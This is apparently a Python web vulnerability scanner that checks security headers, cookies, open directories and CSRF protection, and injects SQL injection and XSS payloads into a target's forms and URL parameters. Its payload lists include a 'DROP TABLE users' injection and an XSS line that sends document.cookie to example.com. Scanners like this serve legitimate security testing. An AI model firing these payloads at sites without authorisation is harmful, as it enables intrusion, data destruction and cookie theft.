import logging
import requests
import re
import random
import string
import json
from datetime import datetime
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs, urlencode

logger = logging.getLogger(__name__)

# SQL Injection payloads
SQL_INJECTION_PAYLOADS = [
    "' OR '1'='1", 
    "' OR '1'='1' --", 
    "' OR '1'='1' /*", 
    "' OR 1=1--", 
    "' UNION SELECT NULL, NULL, NULL--",
    "'; DROP TABLE users; --",
    "1' OR '1' = '1",
    "1 OR 1=1",
    "1' AND 1=1--",
    "admin' --",
    "1'; WAITFOR DELAY '0:0:5'--"
]

# XSS payloads
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "javascript:alert('XSS')",
    "\"><script>alert('XSS')</script>",
    "'><script>alert('XSS')</script>",
    "<script>fetch('https://example.com?cookie='+document.cookie)</script>",
    "<div style=\"background-image: url(javascript:alert('XSS'))\">",
    "<iframe src=\"javascript:alert('XSS')\"></iframe>"
]

# Security headers to check
SECURITY_HEADERS = [
    'Content-Security-Policy',
    'X-Frame-Options',
    'X-XSS-Protection',
    'X-Content-Type-Options',
    'Strict-Transport-Security',
    'Referrer-Policy',
    'Feature-Policy',
    'Permissions-Policy'
]

def perform_vulnerability_scan(url, scan_type='full'):
    """
    Perform vulnerability scan on a target URL
    
    Args:
        url (str): Target URL
        scan_type (str): Type of scan (full, quick, headers)
        
    Returns:
        dict: Vulnerability scan results
    """
    logger.info(f"Starting vulnerability scan for {url} (type: {scan_type})")
    
    results = {
        "scan_type": scan_type,
        "target_url": url,
        "scan_timestamp": datetime.now().isoformat(),
        "vulnerabilities_found": 0
    }
    
    try:
        # Add User-Agent to avoid being blocked
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }
        
        # First check if the site is accessible
        try:
            response = requests.get(url, timeout=10, headers=headers)
            results["site_accessible"] = True
            results["http_status"] = response.status_code
            
            # Check if we got redirected (could indicate HTTP -> HTTPS)
            if response.url != url:
                results["redirected_to"] = response.url
                url = response.url  # Update URL for further scanning
        except requests.RequestException as e:
            results["site_accessible"] = False
            results["connection_error"] = str(e)
            return results
        
        # Check SSL/TLS if it's HTTPS
        if url.startswith("https"):
            parsed_url = urlparse(url)
            results["ssl_info"] = {
                "protocol": "https",
                "hostname": parsed_url.netloc
            }
            
            # Check if the certificate is valid using requests built-in verification
            try:
                requests.get(url, timeout=10, verify=True)
                results["ssl_info"]["certificate_valid"] = "valid"
            except requests.exceptions.SSLError:
                results["ssl_info"]["certificate_valid"] = "invalid"
        
        # Check security headers (basic scan)
        headers_results = check_security_headers(url)
        results.update(headers_results)
        
        # If it's just a headers scan, return results now
        if scan_type == 'headers':
            # Count vulnerabilities
            if headers_results.get("missing_headers"):
                results["vulnerabilities_found"] += len(headers_results.get("missing_headers", []))
            return results
            
        # Find entry points for testing
        entry_points = find_entry_points(url)
        results["entry_points_found"] = {
            "forms": len(entry_points.get("forms", [])),
            "get_params": len(entry_points.get("get_params", [])),
            "directories": len(entry_points.get("directories", [])),
            "links": len(entry_points.get("links", [])),
            "js_endpoints": len(entry_points.get("js_endpoints", []))
        }
        
        # Perform quick scan with basic checks
        vulnerability_checks = []
        
        # Basic checks for quick scan
        # Check for SQL Injection
        sql_injection_results = check_sql_injection(url, entry_points)
        results.update(sql_injection_results)
        if sql_injection_results.get("sql_injection"):
            vulnerability_checks.append({
                "name": "SQL Injection",
                "status": "vulnerable",
                "details": sql_injection_results.get("sql_injection_details", [])
            })
            results["vulnerabilities_found"] += len(sql_injection_results.get("sql_injection_details", []))
        else:
            vulnerability_checks.append({
                "name": "SQL Injection",
                "status": "not_vulnerable"
            })
        
        # Check for XSS
        xss_results = check_xss(url, entry_points)
        results.update(xss_results)
        if xss_results.get("xss"):
            vulnerability_checks.append({
                "name": "Cross-Site Scripting (XSS)",
                "status": "vulnerable",
                "details": xss_results.get("xss_details", [])
            })
            results["vulnerabilities_found"] += len(xss_results.get("xss_details", []))
        else:
            vulnerability_checks.append({
                "name": "Cross-Site Scripting (XSS)",
                "status": "not_vulnerable"
            })
        
        # Check for CSRF vulnerabilities
        csrf_results = check_csrf(url, entry_points)
        results.update(csrf_results)
        if csrf_results.get("csrf"):
            vulnerability_checks.append({
                "name": "Cross-Site Request Forgery (CSRF)",
                "status": "vulnerable",
                "details": csrf_results.get("csrf_details", [])
            })
            results["vulnerabilities_found"] += len(csrf_results.get("csrf_details", []))
        else:
            vulnerability_checks.append({
                "name": "Cross-Site Request Forgery (CSRF)",
                "status": "not_vulnerable"
            })
            
        # Check for open directories
        open_dir_results = check_open_directories(url)
        if open_dir_results.get("open_directories"):
            vulnerability_checks.append({
                "name": "Open Directory Listing",
                "status": "vulnerable",
                "details": open_dir_results.get("open_directories", [])
            })
            results["open_directories"] = open_dir_results.get("open_directories", [])
            results["vulnerabilities_found"] += len(open_dir_results.get("open_directories", []))
        else:
            vulnerability_checks.append({
                "name": "Open Directory Listing",
                "status": "not_vulnerable"
            })
        
        # If full scan, add more checks
        if scan_type == 'full':
            # Check for insecure cookies
            cookie_results = check_cookies(url)
            if cookie_results.get("insecure_cookies"):
                vulnerability_checks.append({
                    "name": "Insecure Cookies",
                    "status": "vulnerable",
                    "details": cookie_results.get("insecure_cookies", [])
                })
                results["insecure_cookies"] = cookie_results.get("insecure_cookies", [])
                results["vulnerabilities_found"] += len(cookie_results.get("insecure_cookies", []))
            else:
                vulnerability_checks.append({
                    "name": "Insecure Cookies",
                    "status": "not_vulnerable"
                })
            
            # Check for server information disclosure
            server_info = check_server_info(url)
            if server_info.get("information_disclosure"):
                vulnerability_checks.append({
                    "name": "Server Information Disclosure",
                    "status": "vulnerable",
                    "details": server_info.get("disclosed_info", {})
                })
                results["server_info"] = server_info
                results["vulnerabilities_found"] += 1
            else:
                vulnerability_checks.append({
                    "name": "Server Information Disclosure",
                    "status": "not_vulnerable"
                })
        
        results["vulnerability_checks"] = vulnerability_checks
        logger.info(f"Vulnerability scan completed for {url} - Found {results['vulnerabilities_found']} potential vulnerabilities")
        return results
        
    except Exception as e:
        logger.error(f"Error during vulnerability scan: {str(e)}")
        results["error"] = str(e)
        results["scan_completed"] = False
        return results


def check_open_directories(url):
    """Check for open directory listings"""
    result = {
        "open_directories": []
    }
    
    # Common directories to check
    common_dirs = ["images", "uploads", "files", "backup", "admin", "tmp", "temp", "assets", "static", "media"]
    
    parsed_url = urlparse(url)
    base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
    
    # Add User-Agent to avoid being blocked
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    }
    
    for directory in common_dirs:
        dir_url = f"{base_url}/{directory}/"
        
        try:
            response = requests.get(dir_url, timeout=5, headers=headers)
            
            # Check for directory listing by looking for typical directory listing patterns
            if response.status_code == 200:
                body = response.text.lower()
                if (
                    ("index of /" in body or "directory listing" in body) and
                    (
                        ("parent directory" in body and "last modified" in body) or
                        ("<tr><td><a href=" in body and "name" in body and "last modified" in body) or
                        ("directory listing for" in body)
                    )
                ):
                    result["open_directories"].append({
                        "url": dir_url,
                        "status_code": response.status_code,
                        "directory": directory
                    })
        except Exception as e:
            logger.error(f"Error checking directory {dir_url}: {str(e)}")
            continue
    
    return result


def check_cookies(url):
    """Check for insecure cookies"""
    result = {
        "insecure_cookies": []
    }
    
    # Add User-Agent to avoid being blocked
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    }
    
    try:
        response = requests.get(url, timeout=10, headers=headers)
        
        if response.cookies:
            for cookie in response.cookies:
                insecure_flags = []
                
                # Check if the cookie is missing security flags
                if not cookie.secure and url.startswith("https"):
                    insecure_flags.append("Missing Secure flag")
                    
                if not cookie.has_nonstandard_attr("HttpOnly"):
                    insecure_flags.append("Missing HttpOnly flag")
                
                # Check SameSite attribute
                samesite = cookie.get_nonstandard_attr("SameSite")
                if not samesite or samesite.lower() == "none":
                    insecure_flags.append("Missing or weak SameSite attribute")
                
                if insecure_flags:
                    result["insecure_cookies"].append({
                        "name": cookie.name,
                        "domain": cookie.domain,
                        "path": cookie.path,
                        "issues": insecure_flags
                    })
    except Exception as e:
        logger.error(f"Error checking cookies for {url}: {str(e)}")
    
    return result


def check_server_info(url):
    """Check for server information disclosure"""
    result = {
        "information_disclosure": False,
        "disclosed_info": {}
    }
    
    # Add User-Agent to avoid being blocked
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    }
    
    try:
        response = requests.get(url, timeout=10, headers=headers)
        response_headers = response.headers
        
        # Check for server header
        if "Server" in response_headers:
            result["disclosed_info"]["server"] = response_headers["Server"]
            result["information_disclosure"] = True
        
        # Check for X-Powered-By header
        if "X-Powered-By" in response_headers:
            result["disclosed_info"]["powered_by"] = response_headers["X-Powered-By"]
            result["information_disclosure"] = True
            
        # Check for X-AspNet-Version header
        if "X-AspNet-Version" in response_headers:
            result["disclosed_info"]["aspnet_version"] = response_headers["X-AspNet-Version"]
            result["information_disclosure"] = True
            
        # Check for X-Runtime header
        if "X-Runtime" in response_headers:
            result["disclosed_info"]["runtime"] = response_headers["X-Runtime"]
            result["information_disclosure"] = True
        
    except Exception as e:
        logger.error(f"Error checking server info for {url}: {str(e)}")
    
    return result

def check_security_headers(url):
    """Check for missing security headers"""
    try:
        # Add User-Agent to avoid being blocked
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }
        response = requests.get(url, timeout=10, allow_redirects=True, headers=headers)
        response_headers = response.headers
        
        missing_headers = []
        headers_found = {}
        
        # Check each security header
        for header in SECURITY_HEADERS:
            # Case-insensitive header check
            header_found = False
            for resp_header in response_headers:
                if header.lower() == resp_header.lower():
                    header_found = True
                    headers_found[header] = response_headers[resp_header]
                    break
            
            if not header_found:
                missing_headers.append(header)
        
        # Evaluate Content-Security-Policy if present
        if 'Content-Security-Policy' in headers_found:
            csp = headers_found['Content-Security-Policy']
            if "default-src 'none'" not in csp and "default-src 'self'" not in csp:
                missing_headers.append('Content-Security-Policy (weak)')
        
        # Evaluate HSTS if present
        if 'Strict-Transport-Security' in headers_found:
            hsts = headers_found['Strict-Transport-Security']
            if 'max-age=' in hsts:
                try:
                    max_age = int(hsts.split('max-age=')[1].split(';')[0])
                    if max_age < 15768000:  # Less than 6 months
                        missing_headers.append('Strict-Transport-Security (weak)')
                except:
                    pass
        
        return {
            "missing_headers": missing_headers,
            "headers_found": headers_found
        }
    except Exception as e:
        logger.error(f"Error checking security headers: {str(e)}")
        return {"missing_headers": [], "error": str(e)}

def find_entry_points(url):
    """Find forms, parameters, and other entry points for testing"""
    entry_points = {
        "forms": [],
        "get_params": [],
        "directories": [],
        "links": [],
        "js_endpoints": []
    }
    
    try:
        # Add User-Agent to avoid being blocked
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }
        response = requests.get(url, timeout=10, headers=headers)
        
        if response.status_code != 200:
            logger.warning(f"Got status code {response.status_code} for {url}")
            return entry_points
            
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # Find forms
        forms = soup.find_all('form')
        for form in forms:
            form_data = {
                "action": form.get('action', ''),
                "method": form.get('method', 'get').lower(),
                "inputs": []
            }
            
            # Get form action URL
            if form_data["action"]:
                form_data["action"] = urljoin(url, form_data["action"])
            else:
                form_data["action"] = url
                
            # Get form inputs
            inputs = form.find_all(['input', 'textarea', 'select'])
            for input_field in inputs:
                input_type = input_field.get('type', 'text')
                input_name = input_field.get('name', '')
                
                if input_name and input_type not in ['submit', 'button', 'reset', 'file', 'image']:
                    form_data["inputs"].append({
                        "name": input_name,
                        "type": input_type
                    })
            
            if form_data["inputs"]:
                entry_points["forms"].append(form_data)
        
        # Find GET parameters in the URL        
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        
        for param, value in query_params.items():
            entry_points["get_params"].append({
                "name": param,
                "value": value[0] if value else ""
            })
        
        # Find GET parameters in links
        links = soup.find_all('a', href=True)
        for link in links:
            href = link['href']
            if href.startswith('#') or href.startswith('javascript:'):
                continue
                
            full_url = urljoin(url, href)
            parsed_link = urlparse(full_url)
            
            # Skip external links and media files
            if parsed_link.netloc and parsed_link.netloc != parsed_url.netloc:
                continue
                
            # Skip media files
            if parsed_link.path.endswith(('.jpg', '.jpeg', '.png', '.gif', '.pdf', '.mp3', '.mp4')):
                continue
                
            # Add link to list for crawling
            if full_url not in entry_points["links"]:
                entry_points["links"].append(full_url)
                
            # Extract GET parameters from link
            if parsed_link.query:
                link_params = parse_qs(parsed_link.query)
                for param, value in link_params.items():
                    param_entry = {
                        "name": param,
                        "value": value[0] if value else "",
                        "url": full_url
                    }
                    if param_entry not in entry_points["get_params"]:
                        entry_points["get_params"].append(param_entry)
        
        # Find API endpoints and AJAX requests in JavaScript
        scripts = soup.find_all('script')
        api_patterns = [
            r'(api\/[a-zA-Z0-9\/_\-\.]+)',
            r'(fetch\([\'"]([^\'")]+)[\'"])',
            r'(axios\.[a-z]+\([\'"]([^\'")]+)[\'"])',
            r'(url:\s*[\'"]([^\'")]+)[\'"])',
            r'(\$\.(?:get|post|ajax)\s*\(\s*[\'"]([^\'")]+)[\'"])'
        ]
        
        for script in scripts:
            if script.string:
                for pattern in api_patterns:
                    matches = re.findall(pattern, script.string)
                    for match in matches:
                        endpoint = match[0] if isinstance(match, tuple) else match
                        if endpoint and endpoint not in entry_points["js_endpoints"]:
                            entry_points["js_endpoints"].append(endpoint)
        
        # Find directories/paths
        path_parts = parsed_url.path.split('/')
        current_path = ""
        
        for part in path_parts:
            if part:
                current_path += f"/{part}"
                if current_path not in entry_points["directories"]:
                    entry_points["directories"].append(current_path)
        
        # Check for common directories that might exist
        common_dirs = ['/admin', '/login', '/register', '/api', '/dashboard', '/user', '/account', '/settings']
        for dir_path in common_dirs:
            if dir_path not in entry_points["directories"]:
                entry_points["directories"].append(dir_path)
                
        return entry_points
    except Exception as e:
        logger.error(f"Error finding entry points: {str(e)}")
        return entry_points

def check_sql_injection(url, entry_points):
    """Check for SQL injection vulnerabilities"""
    results = {
        "sql_injection": False,
        "sql_injection_details": []
    }
    
    vulnerable_params = []
    
    # Check GET parameters
    for param in entry_points.get("get_params", []):
        param_name = param.get("name")
        
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        
        for payload in SQL_INJECTION_PAYLOADS[:3]:  # Use a subset for efficiency
            test_params = query_params.copy()
            test_params[param_name] = [payload]
            
            test_url = parsed_url._replace(query=urlencode(test_params, doseq=True)).geturl()
            
            try:
                response = requests.get(test_url, timeout=10)
                
                # Check for SQL error patterns
                if any(error in response.text.lower() for error in [
                    "sql syntax", "mysql", "sqlite", "oracle", "syntax error", 
                    "unclosed quotation", "unterminated string", "warning: mysql", 
                    "odbc", "sql server", "postgresql", "db2", "database error"
                ]):
                    vulnerable_params.append({
                        "type": "GET",
                        "param": param_name,
                        "payload": payload,
                        "url": test_url
                    })
                    break
            except Exception as e:
                logger.error(f"Error testing SQL injection on GET param {param_name}: {str(e)}")
    
    # Check forms
    for form in entry_points.get("forms", []):
        form_action = form.get("action", url)
        form_method = form.get("method", "get")
        
        for input_field in form.get("inputs", []):
            input_name = input_field.get("name")
            
            for payload in SQL_INJECTION_PAYLOADS[:3]:  # Use a subset for efficiency
                form_data = {}
                
                # Fill form with random data
                for field in form.get("inputs", []):
                    field_name = field.get("name")
                    field_type = field.get("type", "text")
                    
                    if field_type == "email":
                        form_data[field_name] = f"test{random.randint(1, 1000)}@example.com"
                    elif field_type == "number":
                        form_data[field_name] = str(random.randint(1, 100))
                    else:
                        form_data[field_name] = ''.join(random.choices(string.ascii_letters, k=8))
                
                # Insert payload
                form_data[input_name] = payload
                
                try:
                    if form_method == "post":
                        response = requests.post(form_action, data=form_data, timeout=10)
                    else:
                        response = requests.get(form_action, params=form_data, timeout=10)
                    
                    # Check for SQL error patterns
                    if any(error in response.text.lower() for error in [
                        "sql syntax", "mysql", "sqlite", "oracle", "syntax error", 
                        "unclosed quotation", "unterminated string", "warning: mysql", 
                        "odbc", "sql server", "postgresql", "db2", "database error"
                    ]):
                        vulnerable_params.append({
                            "type": form_method.upper(),
                            "form": form_action,
                            "param": input_name,
                            "payload": payload
                        })
                        break
                except Exception as e:
                    logger.error(f"Error testing SQL injection on form {form_action}, field {input_name}: {str(e)}")
    
    if vulnerable_params:
        results["sql_injection"] = True
        results["sql_injection_details"] = vulnerable_params
    
    return results

def check_xss(url, entry_points):
    """Check for XSS vulnerabilities"""
    results = {
        "xss": False,
        "xss_details": []
    }
    
    vulnerable_params = []
    
    # Check GET parameters
    for param in entry_points.get("get_params", []):
        param_name = param.get("name")
        
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        
        for payload in XSS_PAYLOADS[:3]:  # Use a subset for efficiency
            test_params = query_params.copy()
            test_params[param_name] = [payload]
            
            test_url = parsed_url._replace(query=urlencode(test_params, doseq=True)).geturl()
            
            try:
                response = requests.get(test_url, timeout=10)
                
                # Check if payload is reflected
                if payload in response.text:
                    vulnerable_params.append({
                        "type": "GET",
                        "param": param_name,
                        "payload": payload,
                        "url": test_url
                    })
                    break
            except Exception as e:
                logger.error(f"Error testing XSS on GET param {param_name}: {str(e)}")
    
    # Check forms
    for form in entry_points.get("forms", []):
        form_action = form.get("action", url)
        form_method = form.get("method", "get")
        
        for input_field in form.get("inputs", []):
            input_name = input_field.get("name")
            
            for payload in XSS_PAYLOADS[:3]:  # Use a subset for efficiency
                form_data = {}
                
                # Fill form with random data
                for field in form.get("inputs", []):
                    field_name = field.get("name")
                    field_type = field.get("type", "text")
                    
                    if field_type == "email":
                        form_data[field_name] = f"test{random.randint(1, 1000)}@example.com"
                    elif field_type == "number":
                        form_data[field_name] = str(random.randint(1, 100))
                    else:
                        form_data[field_name] = ''.join(random.choices(string.ascii_letters, k=8))
                
                # Insert payload
                form_data[input_name] = payload
                
                try:
                    if form_method == "post":
                        response = requests.post(form_action, data=form_data, timeout=10)
                    else:
                        response = requests.get(form_action, params=form_data, timeout=10)
                    
                    # Check if payload is reflected
                    if payload in response.text:
                        vulnerable_params.append({
                            "type": form_method.upper(),
                            "form": form_action,
                            "param": input_name,
                            "payload": payload
                        })
                        break
                except Exception as e:
                    logger.error(f"Error testing XSS on form {form_action}, field {input_name}: {str(e)}")
    
    if vulnerable_params:
        results["xss"] = True
        results["xss_details"] = vulnerable_params
    
    return results

def check_csrf(url, entry_points):
    """Check for CSRF vulnerabilities"""
    results = {
        "csrf": False,
        "csrf_details": []
    }
    
    vulnerable_forms = []
    
    # Check forms for CSRF token
    for form in entry_points.get("forms", []):
        if form.get("method", "").lower() == "post":
            csrf_token_found = False
            
            # Check for common CSRF token field names
            csrf_field_names = ["csrf", "csrf_token", "_csrf", "token", "authenticity_token", 
                              "_token", "csrfmiddlewaretoken", "xsrf", "_xsrf", "xsrf_token"]
            
            for input_field in form.get("inputs", []):
                field_name = input_field.get("name", "").lower()
                
                if any(csrf_name in field_name for csrf_name in csrf_field_names):
                    csrf_token_found = True
                    break
            
            # If no CSRF token found, check for same-origin headers
            if not csrf_token_found:
                form_action = form.get("action", url)
                
                try:
                    # Add User-Agent to avoid being blocked
                    headers = {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
                    }
                    response = requests.get(form_action, timeout=10, headers=headers)
                    resp_headers = response.headers
                    
                    # Check for headers that might prevent CSRF
                    has_csrf_protection = False
                    
                    # Check for CSP with form-action restriction
                    if resp_headers.get("Content-Security-Policy"):
                        csp = resp_headers.get("Content-Security-Policy", "")
                        if "form-action 'self'" in csp or "form-action 'none'" in csp:
                            has_csrf_protection = True
                    
                    # Check for SameSite cookie attribute
                    cookie_header = resp_headers.get("Set-Cookie", "")
                    if cookie_header and ("SameSite=Strict" in cookie_header or "SameSite=Lax" in cookie_header):
                        has_csrf_protection = True
                    
                    # Check HTML for meta tags that might indicate CSRF protection
                    soup = BeautifulSoup(response.text, 'html.parser')
                    meta_tags = soup.find_all('meta')
                    
                    for meta in meta_tags:
                        if meta.get('name') in ['csrf-token', 'csrf-param', '_csrf']:
                            has_csrf_protection = True
                            break
                    
                    # Check for JavaScript CSRF protection patterns
                    scripts = soup.find_all('script')
                    for script in scripts:
                        if script.string and any(pattern in script.string.lower() for pattern in ['csrf', 'xsrf', 'anti-forgery']):
                            has_csrf_protection = True
                            break
                    
                    # If no CSRF protection found, mark as vulnerable
                    if not has_csrf_protection:
                        # Attempt to check if the form actually requires protection
                        # (i.e., if it modifies server-side state)
                        form_inputs = form.get("inputs", [])
                        state_changing = True  # Assume form changes state unless proven otherwise
                        
                        # Forms that are likely read-only
                        if len(form_inputs) == 1 and form_inputs[0].get("name", "").lower() in ["q", "query", "search", "keyword"]:
                            state_changing = False
                        
                        if state_changing:
                            vulnerable_forms.append({
                                "form": form_action,
                                "method": "POST",
                                "inputs": [f["name"] for f in form.get("inputs", [])],
                                "missing": "No CSRF token or protective headers/cookies"
                            })
                except Exception as e:
                    logger.error(f"Error checking CSRF on form {form_action}: {str(e)}")
    
    if vulnerable_forms:
        results["csrf"] = True
        results["csrf_details"] = vulnerable_forms
    
    return results
